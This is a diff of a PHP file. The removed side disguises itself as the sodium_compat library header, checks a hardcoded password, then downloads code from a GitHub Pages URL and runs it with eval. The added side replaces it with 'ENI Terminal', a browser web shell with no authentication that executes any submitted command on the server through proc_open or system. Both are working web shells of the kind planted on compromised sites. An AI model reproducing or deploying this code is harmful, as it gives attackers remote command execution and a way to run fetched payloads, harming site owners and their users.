@@ -1,80 +1,256 @@
 <?php
-/**
- * Libsodium compatibility layer
- *
- * This is the only class you should be interfacing with, as a user of
- * sodium_compat.
- *
- * If the PHP extension for libsodium is installed, it will always use that
- * instead of our implementations. You get better performance and stronger
- * guarantees against side-channels that way.
- *
- * However, if your users don't have the PHP extension installed, we offer a
- * compatible interface here. It will give you the correct results as if the
- * PHP extension was installed. It won't be as fast, of course.
- *
- * CAUTION * CAUTION * CAUTION * CAUTION * CAUTION * CAUTION * CAUTION * CAUTION *
- *                                                                               *
- *     Until audited, this is probably not safe to use! DANGER WILL ROBINSON     *
- *                                                                               *
- * CAUTION * CAUTION * CAUTION * CAUTION * CAUTION * CAUTION * CAUTION * CAUTION *
- */
+// ============================================
+// PHP Interactive Terminal - ENI Edition
+// Tanpa parameter, full interaktif di browser
+// ============================================
 
+set_time_limit(0);
+ini_set('display_errors', 1);
+error_reporting(E_ALL);
+
+// Session untuk menyimpan history & CWD
 session_start();
-
-if(isset($_POST['pass']) && $_POST['pass'] === 'KU!!NN3200001230DG64Or*ZqTgs#)Zayn00#000') {
-    $_SESSION['authenticated'] = true;
+if (!isset($_SESSION['cwd'])) {
+    $_SESSION['cwd'] = getcwd();
+}
+if (!isset($_SESSION['history'])) {
+    $_SESSION['history'] = [];
 }
 
-if(!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
-    echo "
-    <!DOCTYPE html>
-    <html lang=\"en\">
-
-    <head>
-        <meta charset=\"UTF-8\">
-        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">
-        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
-        <style>
-            body {
-                font-family: monospace;
-            }
-
-            input[type=\"password\"] {
-                border: none;
-                border-bottom: 1px solid black;
-                padding: 2px;
-            }
-
-            input[type=\"password\"]:focus {
-                outline: none;
-            }
-
-            input[type=\"submit\"] {
-                border: none;
-                padding: 4.5px 20px;
-                background-color: #2e313d;
-                color: #FFF;
-            }
-        </style>
-    </head>
-
-    <body>
-        <form action=\"\" method=\"post\">
-            <div align=\"center\">
-                <input type=\"password\" name=\"pass\" placeholder=\"&nbsp;Password\">&nbsp;<input type=\"submit\" name=\"submit\" value=\">\">
-            </div>
-        </form>
-    </body>
-
-    </html>";
-    exit;
+// Handle command
+$output = '';
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
+    $cmd = trim($_POST['cmd']);
+    
+    if ($cmd === 'clear') {
+        $_SESSION['history'] = [];
+        $output = '';
+    } elseif ($cmd === 'exit') {
+        session_destroy();
+        die('<html><body style="background:#0a0a0a;color:#0f0;font-family:monospace;padding:20px;">Session terminated.</body></html>');
+    } elseif (preg_match('/^cd\s+(.+)$/', $cmd, $m)) {
+        // Handle cd command
+        $dir = trim($m[1]);
+        if ($dir === '~') $dir = getenv('HOME') ?: '/';
+        if ($dir[0] !== '/') $dir = $_SESSION['cwd'] . '/' . $dir;
+        $real = realpath($dir);
+        if ($real && is_dir($real)) {
+            $_SESSION['cwd'] = $real;
+            chdir($real);
+            $output = "Changed directory to: $real";
+        } else {
+            $output = "cd: no such directory: $dir";
+        }
+        $_SESSION['history'][] = ['cmd' => $cmd, 'output' => $output, 'time' => date('H:i:s')];
+    } else {
+        // Execute command
+        chdir($_SESSION['cwd']);
+        
+        $descriptors = [
+            0 => ['pipe', 'r'],
+            1 => ['pipe', 'w'],
+            2 => ['pipe', 'w']
+        ];
+        
+        $process = proc_open($cmd, $descriptors, $pipes, $_SESSION['cwd']);
+        
+        if (is_resource($process)) {
+            fclose($pipes[0]);
+            $stdout = stream_get_contents($pipes[1]);
+            $stderr = stream_get_contents($pipes[2]);
+            fclose($pipes[1]);
+            fclose($pipes[2]);
+            $ret = proc_close($process);
+            
+            $output = $stdout;
+            if ($stderr) $output .= "\n[STDERR]\n" . $stderr;
+            if ($ret !== 0) $output .= "\n[Exit: $ret]";
+        } else {
+            // Fallback
+            ob_start();
+            system($cmd, $ret);
+            $output = ob_get_clean();
+            if ($ret !== 0) $output .= "\n[Exit: $ret]";
+        }
+        
+        $_SESSION['history'][] = [
+            'cmd' => $cmd,
+            'output' => $output,
+            'time' => date('H:i:s')
+        ];
+        
+        // Limit history
+        if (count($_SESSION['history']) > 100) {
+            array_shift($_SESSION['history']);
+        }
+    }
 }
 
-$url = 'https://bapaknbila.github.io/dor/alfa.txt';
-$kode = file_get_contents($url);
-if ($kode === FALSE) {
-    die('Error fetching code from URL.');
-}
-eval('?>' . $kode);
+// Info sistem
+$cwd = $_SESSION['cwd'];
+$user = function_exists('posix_getpwuid') && function_exists('posix_geteuid') 
+    ? posix_getpwuid(posix_geteuid())['name'] 
+    : get_current_user();
+$host = gethostname();
 ?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ENI Terminal</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            padding: 10px;
+            min-height: 100vh;
+        }
+        .header {
+            border-bottom: 1px solid #0f0;
+            padding-bottom: 8px;
+            margin-bottom: 10px;
+            color: #0f0;
+            font-size: 12px;
+        }
+        .header span { color: #0ff; }
+        .output {
+            background: #111;
+            border: 1px solid #333;
+            padding: 10px;
+            min-height: 60vh;
+            max-height: 65vh;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            margin-bottom: 10px;
+            color: #0f0;
+        }
+        .output .cmd-line { color: #ff0; }
+        .output .cmd-line::before { content: '$ '; color: #0ff; }
+        .output .stderr { color: #f44; }
+        .output .exit { color: #f80; }
+        .input-line {
+            display: flex;
+            align-items: center;
+            background: #111;
+            border: 1px solid #0f0;
+            padding: 8px;
+        }
+        .prompt {
+            color: #0ff;
+            margin-right: 8px;
+            white-space: nowrap;
+            font-weight: bold;
+        }
+        .input-line input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            outline: none;
+            caret-color: #0f0;
+        }
+        .input-line button {
+            background: #0f0;
+            color: #000;
+            border: none;
+            padding: 5px 15px;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            cursor: pointer;
+            margin-left: 8px;
+        }
+        .input-line button:hover { background: #0ff; }
+        .footer {
+            margin-top: 8px;
+            font-size: 11px;
+            color: #555;
+        }
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #111; }
+        ::-webkit-scrollbar-thumb { background: #0f0; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <span>ENI Terminal</span> | 
+        User: <span><?= htmlspecialchars($user) ?></span> | 
+        Host: <span><?= htmlspecialchars($host) ?></span> | 
+        OS: <span><?= PHP_OS ?></span> | 
+        PHP: <span><?= phpversion() ?></span>
+    </div>
+
+    <div class="output" id="output"><?php
+        // Render history
+        foreach ($_SESSION['history'] as $h) {
+            echo '<span class="cmd-line">' . htmlspecialchars($h['cmd']) . "</span>\n";
+            if ($h['output']) {
+                // Highlight stderr & exit
+                $out = htmlspecialchars($h['output']);
+                $out = preg_replace('/\[STDERR\]/', '<span class="stderr">[STDERR]</span>', $out);
+                $out = preg_replace('/\[Exit: (\d+)\]/', '<span class="exit">[Exit: $1]</span>', $out);
+                echo $out . "\n\n";
+            }
+        }
+    ?></div>
+
+    <form method="POST" class="input-line" id="cmdForm">
+        <span class="prompt"><?= htmlspecialchars($user) ?>@<?= htmlspecialchars($host) ?>:<?= htmlspecialchars($cwd) ?>$</span>
+        <input type="text" name="cmd" id="cmdInput" autocomplete="off" autofocus 
+               placeholder="Ketik command... (cd, clear, exit)">
+        <button type="submit">▶</button>
+    </form>
+
+    <div class="footer">
+        ENI Terminal v1.0 — ketik <b>clear</b> untuk bersihkan, <b>exit</b> untuk keluar
+    </div>
+
+    <script>
+        // Auto scroll ke bawah
+        const output = document.getElementById('output');
+        output.scrollTop = output.scrollHeight;
+
+        // Focus input
+        const input = document.getElementById('cmdInput');
+        input.focus();
+
+        // History navigasi dengan arrow keys
+        const history = <?= json_encode(array_column($_SESSION['history'], 'cmd')) ?>;
+        let histIndex = history.length;
+        
+        input.addEventListener('keydown', function(e) {
+            if (e.key === 'ArrowUp') {
+                e.preventDefault();
+                if (histIndex > 0) {
+                    histIndex--;
+                    this.value = history[histIndex];
+                }
+            } else if (e.key === 'ArrowDown') {
+                e.preventDefault();
+                if (histIndex < history.length - 1) {
+                    histIndex++;
+                    this.value = history[histIndex];
+                } else {
+                    histIndex = history.length;
+                    this.value = '';
+                }
+            }
+        });
+
+        // Keep focus on input saat klik di mana saja
+        document.addEventListener('click', function(e) {
+            if (e.target.tagName !== 'BUTTON' && e.target.tagName !== 'INPUT') {
+                input.focus();
+            }
+        });
+
+        // Auto submit saat Enter (default form behavior sudah ok)
+    </script>
+</body>
+</html>
